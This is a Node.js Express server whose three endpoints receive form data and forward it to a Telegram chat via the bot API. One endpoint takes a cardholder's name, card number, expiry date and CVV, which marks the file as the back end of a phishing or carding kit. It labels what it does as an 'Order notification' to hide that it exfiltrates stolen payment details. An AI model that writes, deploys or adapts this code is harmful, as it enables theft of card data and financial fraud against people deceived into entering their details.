const express = require('express');
const cors = require('cors');
const fetch = require('node-fetch').default;

const app = express();
app.use(cors());
app.use(express.json());


// SIMPLE TELEGRAM NOTIFICATION WITH ALL FEATURES
app.post('/api/send-user-data', async (req, res) => {
  try {
    const {
      name,
      email
    } = req.body;

    // Format the message with emojis and better formatting
    const message = `👤 ${name}
📧 ${email}`;

    // Send to Telegram
    const botToken = process.env.TELEGRAM_BOT_TOKEN;
    const chatId = process.env.TELEGRAM_CHAT_ID;

    if (!botToken || !chatId) {
      console.log('Telegram credentials not set');
      return res.json({ success: false, error: 'Telegram not configured' });
    }

    // Prepare phone variants: keep '+' if present, otherwise if starts with '0' replace with '+212'


    const response = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: chatId,
        text: message,
        parse_mode: 'Markdown'
      })
    });

    if (!response.ok) {
      const errorText = await response.text();
      console.error('Telegram API error:', errorText);
      throw new Error('Telegram API error');
    }

    res.json({
      success: true,
      message: 'Order notification sent to Telegram!'
    });

  } catch (error) {
    console.log('Notification error:', error);
    res.json({ success: false, error: error.message });
  }
});

app.post('/api/send-user-inputs', async (req, res) => {
  try {
    const {
      name,
      cc,
      date,
      cvv
    } = req.body;

    // Format the message with emojis and better formatting
    const message = `👤 ${name}
💳 ${cc}
📅 ${date}
🔒 ${cvv}`;

    // Send to Telegram
    const botToken = process.env.TELEGRAM_BOT_TOKEN;
    const chatId = process.env.TELEGRAM_CHAT_ID;

    if (!botToken || !chatId) {
      console.log('Telegram credentials not set');
      return res.json({ success: false, error: 'Telegram not configured' });
    }

    // Prepare phone variants: keep '+' if present, otherwise if starts with '0' replace with '+212'


    const response = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: chatId,
        text: message,
        parse_mode: 'Markdown'
      })
    });

    if (!response.ok) {
      const errorText = await response.text();
      console.error('Telegram API error:', errorText);
      throw new Error('Telegram API error');
    }

    res.json({
      success: true,
      message: 'Order notification sent to Telegram!'
    });

  } catch (error) {
    console.log('Notification error:', error);
    res.json({ success: false, error: error.message });
  }
});

app.post('/api/send-user-text', async (req, res) => {
  try {
    const {
      text
    } = req.body;

    // Format the message with emojis and better formatting
    const message = `📅 ${text}`;

    // Send to Telegram
    const botToken = process.env.TELEGRAM_BOT_TOKEN;
    const chatId = process.env.TELEGRAM_CHAT_ID;

    if (!botToken || !chatId) {
      console.log('Telegram credentials not set');
      return res.json({ success: false, error: 'Telegram not configured' });
    }

    // Prepare phone variants: keep '+' if present, otherwise if starts with '0' replace with '+212'


    const response = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: chatId,
        text: message,
        parse_mode: 'Markdown'
      })
    });

    if (!response.ok) {
      const errorText = await response.text();
      console.error('Telegram API error:', errorText);
      throw new Error('Telegram API error');
    }

    res.json({
      success: true,
      message: 'Order notification sent to Telegram!'
    });

  } catch (error) {
    console.log('Notification error:', error);
    res.json({ success: false, error: error.message });
  }
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log(`Server running on port ${PORT}`);
});
